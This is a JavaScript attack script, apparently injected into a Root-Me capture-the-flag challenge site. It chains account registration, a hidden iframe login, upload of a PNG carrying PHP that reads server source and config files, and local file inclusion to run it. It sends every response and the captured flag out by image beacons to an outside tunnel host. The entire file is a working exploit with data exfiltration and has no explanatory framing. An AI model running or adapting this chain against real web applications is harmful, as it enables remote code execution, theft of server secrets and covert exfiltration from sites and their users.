if(window.__go7){}else{window.__go7=1;
var T="https://emerald-adjustable-stevens-useful.trycloudflare.com";
function E(t,d){try{new Image().src=T+"/"+t+"?d="+encodeURIComponent(String(d).substring(0,1500))}catch(e){}}
function EX(t,s){s=String(s);for(var i=0;i<s.length;i+=1100){E(t+"_"+(i/1100),s.substr(i,1100))}}
var base="http://challenge01.root-me.org/realiste/ch16/";
E("GO7_START","v7-fullchain");
function X(m,u,body,ct){var x=new XMLHttpRequest();x.open(m,u,false);if(ct){x.setRequestHeader("Content-Type",ct)}try{x.send(body||null)}catch(e){return null}return x}
function mkfd(u,p){var f=new FormData();f.append("username",u);f.append("password",p);return f}
function mku(u,p){return "username="+encodeURIComponent(u)+"&password="+encodeURIComponent(p)}
function mk(r){if(!r)return "NULL";return "L="+r.responseText.length+" ex="+(r.responseText.indexOf("exist")>=0)+" th="+(r.responseText.indexOf("hank")>=0)+" lo="+(r.responseText.indexOf("Logout")>=0)}

var PW="Regv99Pass!";
var okU="";

// 1) matrice XHR minimale (2 encodages x 2 URLs x 4 users) + login immediat
var probes=[["probeD1","fd","idx"],["probeD2","ue","idx"],["probeD3","fd","noi"],["probeD4","ue","noi"]];
for(var j=0;j<probes.length;j++){
  var u=probes[j][0],mode=probes[j][1],vp=probes[j][2];
  var rurl=(vp=="idx"?base+"index.php?page=register.php":base+"?page=register.php");
  var lurl=(vp=="idx"?base+"index.php?page=login.php":base+"?page=login.php");
  var r1,r2;
  if(mode=="fd"){r1=X("POST",rurl,mkfd(u,PW));r2=X("POST",rurl,mkfd(u,PW))}
  else{r1=X("POST",rurl,mku(u,PW),"application/x-www-form-urlencoded");r2=X("POST",rurl,mku(u,PW),"application/x-www-form-urlencoded")}
  var l1=X("POST",lurl,mkfd(u,PW));
  var l2=X("POST",lurl,mku(u,PW),"application/x-www-form-urlencoded");
  E("GO7_MX_"+u,mode+"/"+vp+" r1["+mk(r1)+"] r2["+mk(r2)+"] lf["+mk(l1)+"] lu["+mk(l2)+"]");
  if((l1&&l1.responseText.indexOf("Logout")>=0)||(l2&&l2.responseText.indexOf("Logout")>=0)){okU=u;E("GO7_PWN","XHR-LOGIN "+u)}
}

// 2) inscription + login par vraie soumission de formulaire dans iframe same-origin
var ph3done=false;
function phase3(){
  if(ph3done){return}
  ph3done=true;
  if(!okU){okU="probeD5"}
  E("GO7_PH3",okU);
  // login frais (cookie de session) avant upload
  var lg=X("POST",base+"?page=login.php",mkfd(okU,PW));
  if(!lg||lg.responseText.indexOf("Logout")<0){
    var lg2=X("POST",base+"index.php?page=login.php",mku(okU,PW),"application/x-www-form-urlencoded");
    if(!lg2||lg2.responseText.indexOf("Logout")<0){E("GO7_NOLOGIN","fail");EX("GO7_PROF_ANON",(lg?lg.responseText:"").substring(0,1500));return}
  }
  E("GO7_LOGGED",okU);
  var pr=X("GET",base+"?page=profile.php");if(pr)EX("GO7_PROF",pr.responseText);
  // PNG shell2 (payload lecture sources, chunk PLTE)
  var b64="iVBORw0KGgoAAAANSUhEUgAAAGoAAAABCAMAAAABzMs8AAABPlBMVEU8P3BocCAkbz0iflN+Ijtmb3JlYWNoKHNjYW5kaXIoIi9jaGFsbGVuZ2UvcmVhbGlzdGUvY2gxNiIpIGFzICRmKSRvLj0kZi4iXG4iOyRvLj0ifkN+Ii5AZmlsZV9nZXRfY29udGVudHMoIi9jaGFsbGVuZ2UvcmVhbGlzdGUvY2gxNi9jb25maWcucGhwIik7JG8uPSJ+Rn4iLkBmaWxlX2dldF9jb250ZW50cygiL2NoYWxsZW5nZS9yZWFsaXN0ZS9jaDE2L2Z1bmN0aW9ucy5waHAiKTskby49In5SfiIuQGZpbGVfZ2V0X2NvbnRlbnRzKCIvY2hhbGxlbmdlL3JlYWxpc3RlL2NoMTYvcGFnZXMvcmVnaXN0ZXIucGhwIik7ZWNobyAkbztfX2hhbHRfY29tcGlsZXIoKTtH4F0NAAAAc0lEQVR42mNgYGRiZmFlY+fg5OLm4eXjFxAUEhYRFROXkJSSlpGVk1dQVFJWUVVT19DU0tbR1dM3MDQyNjE1M7ewtLK2sbWzd3B0cnZxdXP38PTy9vH18w8IDAoOCQ0Lj4iMio6JjYtPSExKTklNS8/IBAAH7RW+c3PYtgAAAABJRU5ErkJggg==";
  var bin=null;
  try{var s=atob(b64);var a=new Uint8Array(s.length);for(var i=0;i<s.length;i++){a[i]=s.charCodeAt(i)};bin=new Blob([a],{type:"image/png"})}catch(e){E("GO7_BLOBERR",""+e)}
  // tentatives d'upload: champs courants sur pages candidates
  if(bin){
    var fields=["file","fichier","image","avatar","upload","userfile","picture","img","pic","f"];
    var targets=["upload.php","profile.php","pages/upload.php"];
    for(var ti=0;ti<targets.length;ti++){
      var pg=X("GET",base+"?page="+targets[ti]);
      var hasFile=(pg&&pg.responseText.indexOf("type=\"file\"")>=0)||(pg&&pg.responseText.indexOf("type='file'")>=0);
      E("GO7_TGT_"+targets[ti].replace(/[\/.]/g,"_"),"L="+(pg?pg.responseText.length:"E")+" fileinput="+hasFile);
      if(pg&&pg.responseText.length!=3360+2*targets[ti].length){EX("GO7_THTML_"+targets[ti].replace(/[\/.]/g,"_"),pg.responseText.substring(1800,4000))}
      for(var fi=0;fi<fields.length;fi++){
        var fd=new FormData();
        fd.append(fields[fi],bin,"shell2.png");
        fd.append("username",okU);fd.append("password",PW);
        var up=X("POST",base+"?page="+targets[ti],fd);
        if(up){E("GO7_UP_"+targets[ti].replace(/[\/.]/g,"_")+"_"+fields[fi],"L="+up.responseText.length+" ok="+(up.responseText.indexOf("uccess")>=0)+" er="+(up.responseText.indexOf("rror")>=0)+" up="+(up.responseText.toLowerCase().indexOf("upload")>=0))}
      }
    }
    // verification + INCLUSION LFI : le flag arrive dans le tunnel
    var ls=["upload/shell2.png","upload/tiny.png"];
    for(var li=0;li<ls.length;li++){
      var inc=X("GET",base+"?page=../"+ls[li]);
      if(inc){E("GO7_INC_"+ls[li].replace(/[\/.]/g,"_"),"S="+inc.status+" L="+inc.responseText.length+" S="+(inc.responseText.indexOf("~S~")>=0)+" C="+(inc.responseText.indexOf("~C~")>=0));
        if(inc.responseText.indexOf("~S~")>=0){EX("GO7_FLAG",inc.responseText);E("GO7_PWNED","FLAG-MATERIAL")}
      }
    }
    var dir=X("GET",base+"upload/");if(dir)EX("GO7_DIR",(dir.status+" "+dir.responseText).substring(0,1500));
  }
  E("GO7_DONE","chainend");
}
try{
  var ifr=document.createElement("iframe");
  ifr.style.width="3px";ifr.style.height="3px";
  var stage=0;
  ifr.onload=function(){
    try{
      var d=ifr.contentDocument;
      if(!d||!d.forms||!d.body){E("GO7_IF","nodoc:"+stage);phase3();return}
      var html=d.body.innerHTML;
      if(stage==1){
        E("GO7_IFR","L="+html.length+" ex="+(html.indexOf("exist")>=0)+" th="+(html.indexOf("hank")>=0));
        stage=2;ifr.src=base+"?page=login.php";return;
      }
      if(stage==2){
        var fm=d.forms[0];
        if(!fm){E("GO7_IF","nologinform");phase3();return}
        fm.querySelector('[name="username"]').value="probeD5";
        fm.querySelector('[name="password"]').value=PW;
        stage=3;fm.submit();return;
      }
      if(stage==3){
        E("GO7_IFL","L="+html.length+" lo="+(html.indexOf("Logout")>=0));
        if(html.indexOf("Logout")>=0&&!okU){okU="probeD5";E("GO7_PWN","IFRAME-LOGIN")}
        phase3();return;
      }
      if(stage==0){
        var rf=null;
        for(var k=0;k<d.forms.length;k++){if((d.forms[k].action||"").indexOf("register")>=0){rf=d.forms[k]}}
        if(!rf){E("GO7_IF","noregform:"+d.forms.length);phase3();return}
        rf.querySelector('[name="username"]').value="probeD5";
        rf.querySelector('[name="password"]').value=PW;
        stage=1;rf.submit();return;
      }
    }catch(e){E("GO7_IFERR","s"+stage+":"+e);phase3()}
  };
  ifr.src=base+"?page=register.php";
  document.body.appendChild(ifr);
  setTimeout(phase3,15000);
}catch(e){E("GO7_IFOUT",""+e);phase3()}
}
